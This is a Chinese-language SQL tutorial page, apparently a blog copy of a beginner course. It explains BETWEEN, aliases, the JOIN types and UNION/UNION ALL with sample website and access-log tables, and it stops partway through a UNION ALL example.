<p>SQL BETWEEN 语法</p>
<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> column_name(s)</span><br><span class="line"><span class="keyword">FROM</span> table_name</span><br><span class="line"><span class="keyword">WHERE</span> column_name <span class="keyword">BETWEEN</span> value1 <span class="keyword">AND</span> value2;</span><br></pre></td></tr></table></figure>

<p>BETWEEN 操作符实例</p>
<p>下面的 SQL 语句选取 alexa 介于 1 和 20 之间的所有网站：</p>
<p>实例</p>
<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> Websites</span><br><span class="line"><span class="keyword">WHERE</span> alexa <span class="keyword">BETWEEN</span> <span class="number">1</span> <span class="keyword">AND</span> <span class="number">20</span>;</span><br></pre></td></tr></table></figure>

<p>NOT BETWEEN 操作符实例</p>
<p>如需显示不在上面实例范围内的网站，请使用 NOT BETWEEN：</p>
<p>实例</p>
<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> Websites</span><br><span class="line"><span class="keyword">WHERE</span> alexa <span class="keyword">NOT</span> <span class="keyword">BETWEEN</span> <span class="number">1</span> <span class="keyword">AND</span> <span class="number">20</span>;</span><br></pre></td></tr></table></figure>

<p>带有 IN 的 BETWEEN 操作符实例</p>
<p>下面的 SQL 语句选取 alexa 介于 1 和 20 之间但 country 不为 USA 和 IND 的所有网站：</p>
<p>实例</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> Websites</span><br><span class="line"><span class="keyword">WHERE</span> (alexa <span class="keyword">BETWEEN</span> <span class="number">1</span> <span class="keyword">AND</span> <span class="number">20</span>)</span><br><span class="line"><span class="keyword">AND</span> country <span class="keyword">NOT</span> <span class="keyword">IN</span> (<span class="string">'USA'</span>, <span class="string">'IND'</span>);</span><br></pre></td></tr></table></figure>

<p>带有文本值的 BETWEEN 操作符实例</p>
<p>下面的 SQL 语句选取 name 以介于 ‘A’ 和 ‘H’ 之间字母<strong>开始</strong>的所有网站：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> Websites</span><br><span class="line"><span class="keyword">WHERE</span> <span class="keyword">name</span> <span class="keyword">BETWEEN</span> <span class="string">'A'</span> <span class="keyword">AND</span> <span class="string">'H'</span>;</span><br></pre></td></tr></table></figure>

<p>带有日期值的 BETWEEN 操作符实例</p>
<p>下面的 SQL 语句选取 date 介于 ‘2016-05-10’ 和 ‘2016-05-14’ 之间的所有访问记录：</p>
<p>实例</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> access_log</span><br><span class="line"><span class="keyword">WHERE</span> <span class="built_in">date</span> <span class="keyword">BETWEEN</span> <span class="string">'2016-05-10'</span> <span class="keyword">AND</span> <span class="string">'2016-05-14'</span>;</span><br></pre></td></tr></table></figure>

<p>请注意，在不同的数据库中，BETWEEN 操作符会产生不同的结果！</p>
<p>在某些数据库中，BETWEEN 选取介于两个值之间但不包括两个测试值的字段。<br>在某些数据库中，BETWEEN 选取介于两个值之间且包括两个测试值的字段。<br>在某些数据库中，BETWEEN 选取介于两个值之间且包括第一个测试值但不包括最后一个测试值的字段。</p>
<p>因此，请检查您的数据库是如何处理 BETWEEN 操作符</p>
<h4 id="SQL-别名"><a href="#SQL-别名" class="headerlink" title="SQL 别名"></a>SQL 别名</h4><p>通过使用 SQL，可以为表名称或列名称指定别名。</p>
<p>基本上，创建别名是为了让列名称的可读性更强。</p>
<p>列的 SQL 别名语法</p>
<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> column_name <span class="keyword">AS</span> alias_name</span><br><span class="line"><span class="keyword">FROM</span> table_name;</span><br></pre></td></tr></table></figure>

<p>表的 SQL 别名语法</p>
<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> column_name(s)</span><br><span class="line"><span class="keyword">FROM</span> table_name <span class="keyword">AS</span> alias_name;</span><br></pre></td></tr></table></figure>

<p>列的别名实例</p>
<p>下面的 SQL 语句指定了两个别名，一个是 name 列的别名，一个是 country 列的别名。<strong>提示：</strong>如果列名称包含空格，要求使用双引号或方括号：</p>
<p>实例</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="keyword">name</span> <span class="keyword">AS</span> n, country <span class="keyword">AS</span> c</span><br><span class="line"><span class="keyword">FROM</span> Websites;</span><br></pre></td></tr></table></figure>

<p>在下面的 SQL 语句中，我们把三个列（url、alexa 和 country）结合在一起，并创建一个名为 “site_info” 的别名：</p>
<p>实例</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="keyword">name</span>, <span class="keyword">CONCAT</span>(<span class="keyword">url</span>, <span class="string">', '</span>, alexa, <span class="string">', '</span>, country) <span class="keyword">AS</span> site_info</span><br><span class="line"><span class="keyword">FROM</span> Websites;</span><br></pre></td></tr></table></figure>

<p>表的别名实例</p>
<p>下面的 SQL 语句选取 “菜鸟教程” 的访问记录。我们使用 “Websites” 和 “access_log” 表，并分别为它们指定表别名 “w” 和 “a”（通过使用别名让 SQL 更简短）：</p>
<p>实例</p>
<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> w.name, w.url, a.<span class="built_in">count</span>, a.date </span><br><span class="line"><span class="keyword">FROM</span> Websites <span class="keyword">AS</span> w, access_log <span class="keyword">AS</span> a </span><br><span class="line"><span class="keyword">WHERE</span> a.site_id=w.id <span class="keyword">and</span> w.name=<span class="string">"菜鸟教程"</span>;</span><br></pre></td></tr></table></figure>

<p>不带别名的相同的 SQL 语句：</p>
<p>实例</p>
<figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">SELECT</span> Websites.<span class="built_in">name</span>, Websites.url, access_log.<span class="built_in">count</span>, access_log.<span class="built_in">date</span> </span><br><span class="line"><span class="keyword">FROM</span> Websites, access_log </span><br><span class="line">WHERE Websites.id=access_log.site_id <span class="built_in">and</span> Websites.<span class="built_in">name</span>=<span class="string">"菜鸟教程"</span>;</span><br></pre></td></tr></table></figure>

<p>在下面的情况下，使用别名很有用：</p>
<ul>
<li>在查询中涉及超过一个表</li>
<li>在查询中使用了函数</li>
<li>列名称很长或者可读性差</li>
<li>需要把两个列或者多个列结合在一起</li>
</ul>
<h3 id="SQL-JOIN"><a href="#SQL-JOIN" class="headerlink" title="SQL JOIN"></a>SQL JOIN</h3><p>SQL join 用于把来自两个或多个表的行结合起来。</p>
<p>下图展示了 LEFT JOIN、RIGHT JOIN、INNER JOIN、OUTER JOIN 相关的 7 种用法。</p>
<p>![img](The First Day for Web/sql-join.png)</p>
<p>SQL JOIN 子句用于把来自两个或多个表的行结合起来，基于这些表之间的共同字段。</p>
<p>SQL INNER JOIN</p>
<p>最常见的 JOIN 类型：<strong>SQL INNER JOIN（简单的 JOIN）</strong>。 SQL INNER JOIN 从多个表中返回满足 JOIN 条件的所有行。</p>
<p>演示数据库</p>
<p>在本教程中，我们将使用 RUNOOB 样本数据库。</p>
<p>下面是选自 “Websites” 表的数据：</p>
<figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">+----+--------------+---------------------------+-------+---------+</span><br><span class="line">|<span class="string"> id </span>|<span class="string"> name         </span>|<span class="string"> url                       </span>|<span class="string"> alexa </span>|<span class="string"> country </span>|</span><br><span class="line">+----+--------------+---------------------------+-------+---------+</span><br><span class="line">|<span class="string"> 1  </span>|<span class="string"> Google       </span>|<span class="string"> https://www.google.cm/    </span>|<span class="string"> 1     </span>|<span class="string"> USA     </span>|</span><br><span class="line">|<span class="string"> 2  </span>|<span class="string"> 淘宝          </span>|<span class="string"> https://www.taobao.com/   </span>|<span class="string"> 13    </span>|<span class="string"> CN      </span>|</span><br><span class="line">|<span class="string"> 3  </span>|<span class="string"> 菜鸟教程      </span>|<span class="string"> http://www.runoob.com/    </span>|<span class="string"> 4689  </span>|<span class="string"> CN      </span>|</span><br><span class="line">|<span class="string"> 4  </span>|<span class="string"> 微博          </span>|<span class="string"> http://weibo.com/         </span>|<span class="string"> 20    </span>|<span class="string"> CN      </span>|</span><br><span class="line">|<span class="string"> 5  </span>|<span class="string"> Facebook     </span>|<span class="string"> https://www.facebook.com/ </span>|<span class="string"> 3     </span>|<span class="string"> USA     </span>|</span><br><span class="line">|<span class="string"> 7  </span>|<span class="string"> stackoverflow </span>|<span class="string"> http://stackoverflow.com/ </span>|<span class="string">   0 </span>|<span class="string"> IND     </span>|</span><br><span class="line">+----+---------------+---------------------------+-------+---------+</span><br></pre></td></tr></table></figure>

<p>下面是 “access_log” 网站访问记录表的数据：</p>
<figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; SELECT * FROM access_log;</span><br><span class="line">+-----+---------+-------+------------+</span><br><span class="line">| aid | site_id | count | date       |</span><br><span class="line">+-----+---------+-------+------------+</span><br><span class="line">|   <span class="number">1</span> |       <span class="number">1</span> |    <span class="number">45</span> | <span class="number">2016</span><span class="number">-05</span><span class="number">-10</span> |</span><br><span class="line">|   <span class="number">2</span> |       <span class="number">3</span> |   <span class="number">100</span> | <span class="number">2016</span><span class="number">-05</span><span class="number">-13</span> |</span><br><span class="line">|   <span class="number">3</span> |       <span class="number">1</span> |   <span class="number">230</span> | <span class="number">2016</span><span class="number">-05</span><span class="number">-14</span> |</span><br><span class="line">|   <span class="number">4</span> |       <span class="number">2</span> |    <span class="number">10</span> | <span class="number">2016</span><span class="number">-05</span><span class="number">-14</span> |</span><br><span class="line">|   <span class="number">5</span> |       <span class="number">5</span> |   <span class="number">205</span> | <span class="number">2016</span><span class="number">-05</span><span class="number">-14</span> |</span><br><span class="line">|   <span class="number">6</span> |       <span class="number">4</span> |    <span class="number">13</span> | <span class="number">2016</span><span class="number">-05</span><span class="number">-15</span> |</span><br><span class="line">|   <span class="number">7</span> |       <span class="number">3</span> |   <span class="number">220</span> | <span class="number">2016</span><span class="number">-05</span><span class="number">-15</span> |</span><br><span class="line">|   <span class="number">8</span> |       <span class="number">5</span> |   <span class="number">545</span> | <span class="number">2016</span><span class="number">-05</span><span class="number">-16</span> |</span><br><span class="line">|   <span class="number">9</span> |       <span class="number">3</span> |   <span class="number">201</span> | <span class="number">2016</span><span class="number">-05</span><span class="number">-17</span> |</span><br><span class="line">+-----+---------+-------+------------+</span><br><span class="line"><span class="number">9</span> rows in set (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure>

<p>请注意，”Websites” 表中的 “<strong>id</strong>“ 列指向 “access_log” 表中的字段 “<strong>site_id</strong>“。上面这两个表是通过 “site_id” 列联系起来的。</p>
<p>然后，如果我们运行下面的 SQL 语句（包含 INNER JOIN）：</p>
<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> Websites.id, Websites.name, access_log.<span class="built_in">count</span>, access_log.date</span><br><span class="line"><span class="keyword">FROM</span> Websites</span><br><span class="line"><span class="keyword">INNER</span> <span class="keyword">JOIN</span> access_log</span><br><span class="line"><span class="keyword">ON</span> Websites.id=access_log.site_id;</span><br></pre></td></tr></table></figure>

<p>执行以上 SQL 输出结果如下：</p>
<p>![img](The First Day for Web/join1.jpg)</p>
<p>不同的 SQL JOIN</p>
<p>在我们继续讲解实例之前，我们先列出您可以使用的不同的 SQL JOIN 类型：</p>
<ul>
<li><strong>INNER JOIN</strong>：如果表中有至少一个匹配，则返回行</li>
<li><strong>LEFT JOIN</strong>：即使右表中没有匹配，也从左表返回所有的行</li>
<li><strong>RIGHT JOIN</strong>：即使左表中没有匹配，也从右表返回所有的行</li>
<li><strong>FULL JOIN</strong>：只要其中一个表中存在匹配，则返回行</li>
</ul>
<p>首先，连接的结果可以在逻辑上看作是由SELECT语句指定的列组成的新表。</p>
<p>左连接与右连接的左右指的是以两张表中的哪一张为基准，它们都是外连接。</p>
<p>外连接就好像是为非基准表添加了一行全为空值的万能行，用来与基准表中找不到匹配的行进行匹配。假设两个没有空值的表进行左连接，左表是基准表，左表的所有行都出现在结果中，右表则可能因为无法与基准表匹配而出现是空值的字段。</p>
<p>这部分主要涉及的是表连接的逻辑问题，</p>
<p>得到的结果数：</p>
<figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">inner <span class="built_in">join</span> &lt;= <span class="built_in">min</span>(<span class="keyword">left</span> <span class="built_in">join</span>, <span class="keyword">right</span> <span class="built_in">join</span>)</span><br><span class="line">full <span class="built_in">join</span> &gt;= <span class="built_in">max</span>(<span class="keyword">left</span> <span class="built_in">join</span>, <span class="keyword">right</span> <span class="built_in">join</span>)</span><br><span class="line">当 inner <span class="built_in">join</span> &lt; <span class="built_in">min</span>(<span class="keyword">left</span> <span class="built_in">join</span>, <span class="keyword">right</span> <span class="built_in">join</span>) 时， full <span class="built_in">join</span> &gt; <span class="built_in">max</span>(<span class="keyword">left</span> <span class="built_in">join</span>, <span class="keyword">right</span> <span class="built_in">join</span>)</span><br></pre></td></tr></table></figure>

<h4 id="SQL-INNER-JOIN-关键字"><a href="#SQL-INNER-JOIN-关键字" class="headerlink" title="SQL INNER JOIN 关键字"></a>SQL INNER JOIN 关键字</h4><p>INNER JOIN 关键字在表中存在至少一个匹配时返回行。</p>
<p>SQL INNER JOIN 语法</p>
<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> column_name(s)</span><br><span class="line"><span class="keyword">FROM</span> table1</span><br><span class="line"><span class="keyword">INNER</span> <span class="keyword">JOIN</span> table2</span><br><span class="line"><span class="keyword">ON</span> table1.column_name=table2.column_name;</span><br></pre></td></tr></table></figure>

<p>或：</p>
<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> column_name(s)</span><br><span class="line"><span class="keyword">FROM</span> table1</span><br><span class="line"><span class="keyword">JOIN</span> table2</span><br><span class="line"><span class="keyword">ON</span> table1.column_name=table2.column_name;</span><br></pre></td></tr></table></figure>

<p><strong>注释：</strong>INNER JOIN 与 JOIN 是相同的。</p>
<p>![SQL INNER JOIN](The First Day for Web/img_innerjoin.gif)</p>
<p>SQL INNER JOIN 实例</p>
<p>下面的 SQL 语句将返回所有网站的访问记录：</p>
<p>实例</p>
<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> Websites.name, access_log.<span class="built_in">count</span>, access_log.date</span><br><span class="line"><span class="keyword">FROM</span> Websites</span><br><span class="line"><span class="keyword">INNER</span> <span class="keyword">JOIN</span> access_log</span><br><span class="line"><span class="keyword">ON</span> Websites.id=access_log.site_id</span><br><span class="line"><span class="keyword">ORDER</span> <span class="keyword">BY</span> access_log.<span class="built_in">count</span>;</span><br></pre></td></tr></table></figure>

<p><strong>注释：</strong>INNER JOIN 关键字在表中存在至少一个匹配时返回行。如果 “Websites” 表中的行在 “access_log” 中没有匹配，则不会列出这些行。</p>
<h4 id="SQL-LEFT-JOIN-关键字"><a href="#SQL-LEFT-JOIN-关键字" class="headerlink" title="SQL LEFT JOIN 关键字"></a>SQL LEFT JOIN 关键字</h4><p>LEFT JOIN 关键字从左表（table1）返回所有的行，即使右表（table2）中没有匹配。如果右表中没有匹配，则结果为 NULL。</p>
<p>SQL LEFT JOIN 语法</p>
<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> column_name(s)</span><br><span class="line"><span class="keyword">FROM</span> table1</span><br><span class="line"><span class="keyword">LEFT</span> <span class="keyword">JOIN</span> table2</span><br><span class="line"><span class="keyword">ON</span> table1.column_name=table2.column_name;</span><br></pre></td></tr></table></figure>

<p>或：</p>
<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> column_name(s)</span><br><span class="line"><span class="keyword">FROM</span> table1</span><br><span class="line"><span class="keyword">LEFT</span> <span class="keyword">OUTER</span> <span class="keyword">JOIN</span> table2</span><br><span class="line"><span class="keyword">ON</span> table1.column_name=table2.column_name;</span><br></pre></td></tr></table></figure>

<p><strong>注释：</strong>在某些数据库中，LEFT JOIN 称为 LEFT OUTER JOIN。</p>
<p>![SQL LEFT JOIN](The First Day for Web/img_leftjoin.gif)</p>
<p>SQL LEFT JOIN 实例</p>
<p>下面的 SQL 语句将返回所有网站及他们的访问量（如果有的话）。</p>
<p>以下实例中我们把 Websites 作为左表，access_log 作为右表：</p>
<p>实例</p>
<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> Websites.name, access_log.<span class="built_in">count</span>, access_log.date</span><br><span class="line"><span class="keyword">FROM</span> Websites</span><br><span class="line"><span class="keyword">LEFT</span> <span class="keyword">JOIN</span> access_log</span><br><span class="line"><span class="keyword">ON</span> Websites.id=access_log.site_id</span><br><span class="line"><span class="keyword">ORDER</span> <span class="keyword">BY</span> access_log.<span class="built_in">count</span> <span class="keyword">DESC</span>;</span><br></pre></td></tr></table></figure>

<p>执行以上 SQL 输出结果如下：</p>
<p>![img](The First Day for Web/left-join1.jpg)</p>
<p><strong>注释：</strong>LEFT JOIN 关键字从左表（Websites）返回所有的行，即使右表（access_log）中没有匹配。</p>
<p>在使用 <strong>join</strong> 时，<strong>on</strong> 和 <strong>where</strong> 条件的区别如下：</p>
<ul>
<li>1、 <strong>on</strong> 条件是在生成临时表时使用的条件，它不管 <strong>on</strong> 中的条件是否为真，都会返回左边表中的记录。</li>
<li>2、<strong>where</strong> 条件是在临时表生成好后，再对临时表进行过滤的条件。这时已经没有 <strong>left join</strong> 的含义（必须返回左边表的记录）了，条件不为真的就全部过滤掉。</li>
</ul>
<h4 id="SQL-RIGHT-JOIN-关键字"><a href="#SQL-RIGHT-JOIN-关键字" class="headerlink" title="SQL RIGHT JOIN 关键字"></a>SQL RIGHT JOIN 关键字</h4><p>几乎同 LEFT JOIN</p>
<h4 id="SQL-FULL-OUTER-JOIN-关键字"><a href="#SQL-FULL-OUTER-JOIN-关键字" class="headerlink" title="SQL FULL OUTER JOIN 关键字"></a>SQL FULL OUTER JOIN 关键字</h4><p>FULL OUTER JOIN 关键字只要左表（table1）和右表（table2）其中一个表中存在匹配，则返回行.</p>
<p>FULL OUTER JOIN 关键字结合了 LEFT JOIN 和 RIGHT JOIN 的结果。</p>
<p>SQL FULL OUTER JOIN 语法</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> column_name(s)</span><br><span class="line"><span class="keyword">FROM</span> table1</span><br><span class="line"><span class="keyword">FULL</span> <span class="keyword">OUTER</span> <span class="keyword">JOIN</span> table2</span><br><span class="line"><span class="keyword">ON</span> table1.column_name=table2.column_name;</span><br></pre></td></tr></table></figure>

<p>![SQL FULL OUTER JOIN](The First Day for Web/img_fulljoin.gif)</p>
<p>SQL FULL OUTER JOIN 实例</p>
<p>下面的 SQL 语句选取所有网站访问记录。</p>
<p><strong>MySQL中不支持 FULL OUTER JOIN，你可以在 SQL Server 测试以下实例。</strong></p>
<p>实例</p>
<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> Websites.name, access_log.<span class="built_in">count</span>, access_log.date</span><br><span class="line"><span class="keyword">FROM</span> Websites</span><br><span class="line">FULL <span class="keyword">OUTER</span> <span class="keyword">JOIN</span> access_log</span><br><span class="line"><span class="keyword">ON</span> Websites.id=access_log.site_id</span><br><span class="line"><span class="keyword">ORDER</span> <span class="keyword">BY</span> access_log.<span class="built_in">count</span> <span class="keyword">DESC</span>;</span><br></pre></td></tr></table></figure>

<p><strong>注释：</strong>FULL OUTER JOIN 关键字返回左表（Websites）和右表（access_log）中所有的行。如果 “Websites” 表中的行在 “access_log” 中没有匹配或者 “access_log” 表中的行在 “Websites” 表中没有匹配，也会列出这些行。</p>
<h4 id="SQL-UNION-操作符"><a href="#SQL-UNION-操作符" class="headerlink" title="SQL UNION 操作符"></a>SQL UNION 操作符</h4><p>UNION 操作符用于合并两个或多个 SELECT 语句的结果集。</p>
<p>请注意，UNION 内部的每个 SELECT 语句必须拥有相同数量的列。列也必须拥有相似的数据类型。同时，每个 SELECT 语句中的列的顺序必须相同。</p>
<p>SQL UNION 语法</p>
<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> column_name(s) <span class="keyword">FROM</span> table1</span><br><span class="line"><span class="keyword">UNION</span></span><br><span class="line"><span class="keyword">SELECT</span> column_name(s) <span class="keyword">FROM</span> table2;</span><br></pre></td></tr></table></figure>

<p><strong>注释：</strong>默认地，UNION 操作符选取不同的值。如果允许重复的值，请使用 UNION ALL。</p>
<p>SQL UNION ALL 语法</p>
<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> column_name(s) <span class="keyword">FROM</span> table1</span><br><span class="line"><span class="keyword">UNION</span> <span class="keyword">ALL</span></span><br><span class="line"><span class="keyword">SELECT</span> column_name(s) <span class="keyword">FROM</span> table2;</span><br></pre></td></tr></table></figure>

<p><strong>注释：UNION 结果集中的列名总是等于 UNION 中第一个 SELECT 语句中的列名。</strong></p>
<p>演示数据库</p>
<p>在本教程中，我们将使用 RUNOOB 样本数据库。</p>
<p>下面是选自 “Websites” 表的数据：</p>
<figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; SELECT <span class="symbol">*</span> FROM Websites;</span><br><span class="line">+----+--------------+---------------------------+-------+---------+</span><br><span class="line">|<span class="string"> id </span>|<span class="string"> name         </span>|<span class="string"> url                       </span>|<span class="string"> alexa </span>|<span class="string"> country </span>|</span><br><span class="line">+----+--------------+---------------------------+-------+---------+</span><br><span class="line">|<span class="string"> 1  </span>|<span class="string"> Google       </span>|<span class="string"> https://www.google.cm/    </span>|<span class="string"> 1     </span>|<span class="string"> USA     </span>|</span><br><span class="line">|<span class="string"> 2  </span>|<span class="string"> 淘宝          </span>|<span class="string"> https://www.taobao.com/   </span>|<span class="string"> 13    </span>|<span class="string"> CN      </span>|</span><br><span class="line">|<span class="string"> 3  </span>|<span class="string"> 菜鸟教程      </span>|<span class="string"> http://www.runoob.com/    </span>|<span class="string"> 4689  </span>|<span class="string"> CN      </span>|</span><br><span class="line">|<span class="string"> 4  </span>|<span class="string"> 微博          </span>|<span class="string"> http://weibo.com/         </span>|<span class="string"> 20    </span>|<span class="string"> CN      </span>|</span><br><span class="line">|<span class="string"> 5  </span>|<span class="string"> Facebook     </span>|<span class="string"> https://www.facebook.com/ </span>|<span class="string"> 3     </span>|<span class="string"> USA     </span>|</span><br><span class="line">|<span class="string"> 7  </span>|<span class="string"> stackoverflow </span>|<span class="string"> http://stackoverflow.com/ </span>|<span class="string">   0 </span>|<span class="string"> IND     </span>|</span><br><span class="line">+----+---------------+---------------------------+-------+---------+</span><br></pre></td></tr></table></figure>

<p>下面是 “apps” APP 的数据：</p>
<figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; SELECT * FROM apps;</span><br><span class="line"><span class="code">+----+</span>------------<span class="code">+-------------------------+</span>---------+</span><br><span class="line">| id | app<span class="emphasis">_name   | url                     | country |</span></span><br><span class="line"><span class="emphasis">+----+------------+-------------------------+---------+</span></span><br><span class="line"><span class="emphasis">|  1 | QQ APP     | http://im.qq.com/       | CN      |</span></span><br><span class="line"><span class="emphasis">|  2 | 微博 APP | http://weibo.com/       | CN      |</span></span><br><span class="line"><span class="emphasis">|  3 | 淘宝 APP | https://www.taobao.com/ | CN      |</span></span><br><span class="line"><span class="emphasis">+----+------------+-------------------------+---------+</span></span><br><span class="line"><span class="emphasis">3 rows in set (0.00 sec)</span></span><br></pre></td></tr></table></figure>

<p>SQL UNION 实例</p>
<p>下面的 SQL 语句从 “Websites” 和 “apps” 表中选取所有<strong>不同的</strong>country（只有不同的值）：</p>
<p>实例</p>
<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> country <span class="keyword">FROM</span> Websites</span><br><span class="line"><span class="keyword">UNION</span></span><br><span class="line"><span class="keyword">SELECT</span> country <span class="keyword">FROM</span> apps</span><br><span class="line"><span class="keyword">ORDER</span> <span class="keyword">BY</span> country;</span><br></pre></td></tr></table></figure>

<p>执行以上 SQL 输出结果如下：</p>
<p>![img](The First Day for Web/union1.jpg)</p>
<p><strong>注释：</strong>UNION 不能用于列出两个表中所有的country。如果一些网站和APP来自同一个国家，每个国家只会列出一次。UNION 只会选取不同的值。请使用 UNION ALL 来选取重复的值！</p>
<hr>
<p>SQL UNION ALL 实例</p>
<p>下面的 SQL 语句使用 UNION ALL 从 “Websites” 和 “apps” 表中选取<strong>所有的</strong>country（也有重复的值）：</p>
<p>实例</p>
<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> country <span class="keyword">FROM</span> Websites</span><br><span class="line"><span class="keyword">UNION</span> <span class="keyword">ALL</span></span><br><span class="line"><span class="keyword">SELECT</span> country <span class="keyword">FROM</span> apps</span><br><span class="line"><span class="keyword">ORDER</span> <span class="keyword">BY</span> country;</span><br></pre></td></tr></table></figure>

<p>执行以上 SQL 输出结果如下：</p>
<p>![img](The First Day for Web/union2.jpg)</p>
<hr>
<p>带有 WHERE 的 SQL UNION ALL</p>
<p>下面的 SQL 语句使用 UNION ALL 从 “Websites” 和 “apps” 表中选取<strong>所有的</strong>中国(CN)的数据（也有重复的值）：</p>
<p>实例</p>
